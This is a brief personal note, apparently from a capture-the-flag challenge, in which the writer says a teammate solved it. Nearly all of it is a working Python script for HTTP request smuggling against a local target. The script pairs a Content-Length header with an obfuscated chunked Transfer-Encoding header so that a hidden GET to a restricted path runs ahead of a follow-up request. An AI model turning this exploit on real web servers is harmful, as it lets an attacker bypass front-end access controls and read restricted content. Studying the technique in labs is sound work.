---
created: 2026-03-08T15:31
updated: 2026-03-08T15:31
---

I didn't really know what to do after smuggling requests, my teammate solved it.

```python
import socket

TARGET_HOST = "127.0.0.1"
TARGET_PORT = 35827

smuggled_payload = (
    "GET /post/transmission/1 HTTP/1.1\r\n"
    f"Host: {TARGET_HOST}\r\n"
    "X-Ignore: "
)

body = "0\r\n\r\n" + smuggled_payload

request = (
    "OPTIONS /post/main HTTP/1.1\r\n"
    f"Host: {TARGET_HOST}\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    f"Content-Length: {len(body)}\r\n"
    "Transfer-Encoding:  chunked\r\n"
    "\r\n"
    f"{body}"
)

print(f"[*] Sending smuggled request to {TARGET_HOST}:{TARGET_PORT}...")
try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(1)
        s.connect((TARGET_HOST, TARGET_PORT))

        s.sendall(request.encode())
        dummy_request = f"GET /post/main HTTP/1.1\r\nHost: {TARGET_HOST}\r\n\r\n"
        s.sendall(dummy_request.encode())

        while True:
            response = s.recv(4096)
            if not response:
                break
            print(response.decode())
except Exception as e:
    print(f"[!] Error: {e}")
```
